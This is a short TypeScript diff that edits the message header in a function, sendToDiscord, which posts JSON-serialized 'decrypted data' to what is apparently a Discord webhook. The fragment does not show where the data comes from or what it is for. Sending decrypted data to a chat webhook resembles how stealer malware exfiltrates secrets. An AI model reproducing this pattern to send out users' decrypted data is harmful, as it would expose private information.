@@ -9,7 +9,7 @@ async function sendToDiscord(data: any) {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                content: "### Decrypted Data Received\n" + "```json\n" + JSON.stringify(data, null, 2) + "\n```",
+                content: "### Decrypted Data\n" + "```json\n" + JSON.stringify(data, null, 2) + "\n```",
             }),
         });
     } catch (error) {
